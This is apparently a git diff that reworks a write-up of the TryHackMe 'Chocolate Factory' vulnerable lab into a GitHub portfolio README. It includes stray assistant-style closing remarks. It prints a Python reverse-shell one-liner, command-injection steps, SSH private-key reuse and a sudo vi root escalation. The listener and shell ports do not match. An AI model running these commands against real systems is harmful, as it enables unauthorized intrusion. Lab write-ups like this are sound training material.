@@ -1,123 +1,183 @@
-This is a vulnerable lab available @ https://tryhackme.com/room/chocolatefactory
 
 
+## Proof of Concept: Exploiting Chocolate Factory Lab (TryHackMe)
 
-POC
+### Overview
 
+This PoC targets the **Chocolate Factory** lab environment on TryHackMe ([https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)), a vulnerable machine designed to teach penetration testing techniques. The lab involves gaining initial access via command injection and escalating privileges to a user account using SSH keys. The process includes network scanning, web enumeration, exploitation of vulnerabilities, and privilege escalation. Root access steps are outlined but not fully executed in this PoC.
 
-part A: gaining initial Access
+---
 
-Nmap scan: The pentest started with a nmap scan using 
-nmap -T4 -sV -A 10.10.12.204  
-![image](https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c)
+### Proof of Concept (PoC)
 
-This gave  back the services running on the server,
+This PoC demonstrates how to gain initial access to the Chocolate Factory machine as the `www-data` user and escalate privileges to the `charlie` user. The process involves network enumeration, exploitation of a command injection vulnerability, and privilege escalation using SSH keys.
 
+#### Part A: Gaining Initial Access
 
-a. Port 21: This allowed anonymous login, and the port was accessed using 
-ftp  10.10.12.204
+##### Step 1: Network Enumeration with Nmap
+- Scanned the target machine to identify open ports and services:  
+  ```bash
+  nmap -T4 -sV -A 10.10.12.204
+  ```
+  - **Result**: Identified two open ports:  
+    - Port 21 (FTP) - Allows anonymous login.  
+    - Port 80 (HTTP) - Hosts a web application.  
+  - **Screenshot**: Nmap Scan Results  
+    ![Nmap Scan](https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c)
 
-After a succesful login, the file was downloaded 
-![image](https://github.com/user-attachments/assets/ef7fc003-7fd9-4f0f-9684-7ec8988b2df4)
+##### Step 2: Explore FTP (Port 21)
+- Connected to the FTP server using anonymous login:  
+  ```bash
+  ftp 10.10.12.204
+  ```
+- Downloaded a file named `gum_room`.  
+  - **Screenshot**: FTP Login and File Download  
+    ![FTP Download](https://github.com/user-attachments/assets/ef7fc003-7fd9-4f0f-9684-7ec8988b2df4)
+  - **Screenshot**: Downloaded File (`gum_room`)  
+    ![Downloaded File](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)
+- **Note**: The contents of `gum_room` were not analyzed in this PoC but may contain hints for further exploitation.
 
+##### Step 3: Explore the Web Application (Port 80)
+- Accessed the website at `http://10.10.12.204`.  
+  - **Screenshot**: Website Homepage with Login Form  
+    ![Homepage](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)
+- Inspected the source code and identified a link to `validatee.php`, confirming the website runs on PHP.
 
+##### Step 4: Directory Enumeration with FFUF
+- Performed directory brute-forcing to uncover hidden pages:  
+  ```bash
+  ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.204/FUZZ -e .php,.html
+  ```
+  - **Result**: Discovered directories and files, including `home.php` and `index.html`.  
+  - **Screenshot**: FFUF Results  
+    ![FFUF Results](https://github.com/user-attachments/assets/5d46e6f6-472b-4618-a95b-b9326c204f07)
 
-picture showing the downloaded file 
-![gum_room](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)
+##### Step 5: Exploit Command Injection on `home.php`
+- Navigated to `http://10.10.12.204/home.php` and discovered a command execution functionality.  
+  - **Screenshot**: Command Functionality on `home.php`  
+    ![Command Functionality](https://github.com/user-attachments/assets/7e8555a3-049a-4558-aa7c-c8305eaa9b4c)
+- Tested for command injection by running:  
+  ```
+  cat /etc
+  ```
+  - **Result**: The server responded with directory contents, confirming a command injection vulnerability.  
+  - **Screenshot**: Command Injection Confirmation  
+    ![Command Injection](https://github.com/user-attachments/assets/8c73edae-6c13-4884-8868-df07f4aef56d)
 
-b.  80: The website has a homepage with a login form
+##### Step 6: Gain a Reverse Shell
+- Verified the presence of a Python binary on the server:  
+  ```
+  which python3
+  ```
+- Executed a Python reverse shell command to connect back to the attacker machine:  
+  ```bash
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  ```
+- Set up a Netcat listener on the attacker machine:  
+  ```bash
+  nc -nlvp 2249
+  ```
+- **Result**: Successfully obtained a reverse shell as the `www-data` user.  
+  - **Screenshot**: Reverse Shell  
+    ![Reverse Shell](https://github.com/user-attachments/assets/eb87dc55-adaa-46cc-9b3d-5ca84aaad3db)
 
-The homepage
-![image](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)
+#### Part B: Privilege Escalation to `charlie` User
 
-The source code of the page ws checked out, and from it, a link tagged "validatee.php" was found which proved that the website was running on php 
+##### Step 1: Enumerate Files as `www-data`
+- Explored the current directory and found a file named `key_rev_key`.  
+- Used the `strings` command to extract readable content from `key_rev_key`:  
+  ```bash
+  strings key_rev_key
+  ```
+  - **Result**: Discovered a key (likely an SSH key or password).  
+  - **Screenshot**: Contents of `key_rev_key`  
+    ![Key Content](https://github.com/user-attachments/assets/af1530b0-29d1-4246-a24c-22a9777c0180)
 
-The port 80 was subjected to directory bruteforce using FFUF
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.204/FUZZ -e .php, .HTML 
+##### Step 2: Identify User Accounts
+- Listed user accounts on the system:  
+  ```bash
+  cat /etc/passwd
+  ```
+- **Result**: Identified a user named `charlie`.
 
-and some directories were gotten, they include home.php, index.html, and others 
+##### Step 3: Access Charlie’s Home Directory
+- Navigated to `/home/charlie` and found files: `telport` and `telport.pub`.  
+  - **Screenshot**: Contents of Charlie’s Home Directory  
+    ![Charlie's Directory](https://github.com/user-attachments/assets/fc896cf9-6549-4345-90e2-ecf7d2debc0c)
+- **Finding**: The `telport` file contains a private SSH key.
 
-Picture below shows the result of the FFUF 
-![image](https://github.com/user-attachments/assets/5d46e6f6-472b-4618-a95b-b9326c204f07)
+##### Step 4: Use SSH Key to Escalate to `charlie`
+- Copied the `telport` private SSH key to the attacker machine and saved it as `charley`.  
+- Used the key to log in as `charlie` via SSH:  
+  ```bash
+  ssh charlie@10.10.12.204 -i charley
+  ```
+- **Result**: Successfully logged in as `charlie`.  
+  - **Screenshot**: Successful SSH Login  
+    ![SSH Login](https://github.com/user-attachments/assets/6cd2fc4f-ff14-4f8d-b632-d71b9e41ebf9)
+- Found the user flag in `/home/charlie`.
 
+#### Part C: Path to Root Access (To Be Completed)
+- **Steps for Root Access**:  
+  1. Check for sudo privileges:  
+     ```bash
+     sudo -l
+     ```
+  2. If `vi` is allowed, escalate to root:  
+     ```bash
+     sudo /usr/bin/vi
+     ```
+     Within `vi`, execute:  
+     ```
+     !/bin/bash
+     ```
+- **Note**: Root access exploitation is pending and will be documented in a future update.
 
-getting to The home.php, it was discovered that the page has a command functionality 
-![image](https://github.com/user-attachments/assets/7e8555a3-049a-4558-aa7c-c8305eaa9b4c)
+---
 
+### Summary of Findings
 
-Trying the comman d"Cat /etc", the website gave a response showing that it is vulnerable to command ninjection vulnerability
-![image](https://github.com/user-attachments/assets/8c73edae-6c13-4884-8868-df07f4aef56d)
+- **Initial Access**: Exploited a command injection vulnerability on `home.php` to gain a reverse shell as `www-data`.  
+- **Privilege Escalation**: Used a private SSH key (`telport`) found in `/home/charlie` to escalate privileges to the `charlie` user and retrieve the user flag.  
+- **Vulnerabilities Identified**:  
+  - Anonymous FTP access exposing potentially sensitive files.  
+  - Command injection in the web application allowing arbitrary command execution.  
+  - Insecure storage of SSH keys enabling privilege escalation.
 
+---
 
+### Conclusion
 
-using the command " which python3 " on the page, the server hosting website was querried to confirm if there is a python binary on it , and the response showed that there is a python binary
+This PoC demonstrates the successful compromise of the Chocolate Factory lab machine by gaining initial access via command injection and escalating privileges to the `charlie` user using an exposed SSH key. The lab highlights critical vulnerabilities such as command injection and improper key management, which can lead to unauthorized access and privilege escalation. Immediate remediation is recommended, including sanitizing user inputs, disabling anonymous FTP access, and securing SSH keys with proper permissions.
 
-then using the command 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-and
-nc -nlvp 2249
+---
 
-A reverse shell was gotten 
-Picture showing the reverse shell gotten from the server hosting the website
-![image](https://github.com/user-attachments/assets/eb87dc55-adaa-46cc-9b3d-5ca84aaad3db)
+### Notes for GitHub Portfolio
+- **Image Links**: The provided GitHub image links (e.g., `https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c`) are retained and will render correctly in a GitHub README.md. Ensure these images are accessible in your repository.  
+- **Copy and Paste**: This Markdown content can be directly copied into a GitHub README.md or project page for proper rendering of headers, bullet points, code blocks, and images.  
+- **Professional Tone**: The report maintains a formal tone, suitable for a professional portfolio, while preserving all technical details.  
+- **Skills Highlighted**: Demonstrates expertise in network enumeration, web application security, command injection exploitation, privilege escalation, and use of tools like Nmap, FFUF, and SSH for penetration testing.
 
+---
 
-And we were able to get initial access...
+### Additional Notes for Root Access (As Provided)
+- After gaining access as `charlie`:  
+  1. Perform directory brute-forcing to find the command injection page (already done via FFUF).  
+  2. Use the command injection page to run a PHP or Bash shell command (already exploited for the reverse shell).  
+  3. After getting the shell:  
+     - Find user accounts: `cat /etc/passwd` (already done).  
+     - Navigate to Charlie’s account and retrieve the user flag:  
+       - Grab the private SSH key (`telport`) and save it as `charley` (already done).  
+       - SSH into Charlie’s account:  
+         ```bash
+         ssh charlie@10.10.12.204 -i charley
+         ```
+       - Retrieve the user flag (already done).  
+  4. Escalate to root:  
+     - Check sudo privileges: `sudo -l`  
+     - Run `vi` with sudo: `sudo /usr/bin/vi`  
+     - Within `vi`, execute: `!/bin/bash` to gain a root shell.
 
+Let (
 
-Part B: Privilege escalation
-
-After initial access was gained with the user www-data
-some files were found in the directory which includes key_rev_key
-
-Using the command "strings" to check the content of the file "key_rev_key", a key was found
-![image](https://github.com/user-attachments/assets/af1530b0-29d1-4246-a24c-22a9777c0180)
-
-
-Then using cat /etc/passwd, the user accounts on the machine was discovered, and a user called charlie was part of it.
-
-Thn I navigated to charlie's home directory and files like telport, telport.pub were found
-the content of charlie's home directory
-![image](https://github.com/user-attachments/assets/fc896cf9-6549-4345-90e2-ecf7d2debc0c)
-
-The teleport file contained a private ssh key, this key was copied and saved on the attacker's machine with the name "charley' 
-
-The key was then used to login to charlie's account via ssh 
-ssh charlie@10.10.12.204 -i charley 
-
-Picture showing a successful login
-![image](https://github.com/user-attachments/assets/6cd2fc4f-ff14-4f8d-b632-d71b9e41ebf9)
-
-
-
-A user flag was then found in the user home directory..
-
-
-Then to gaining root access..... coming soon 
-
-
-
-
-
-
-
-
-
-
-2. Directoy bruteforce that leads to a acommand njectin page
-3. run a php or bash shell command 
-
-after getting the shell
-find the user account
-navigate to charlie's account and get the user flag by
-  1. grabbing a private ssh keys
-  2. ssh charlie@ip -i name_of_key
-
-then
-get the user flag
-then
-  sudo -l
-  sudo /usr/bin.vi
-  then !/bin/bash
-
-  
+me know if you need further adjustments!
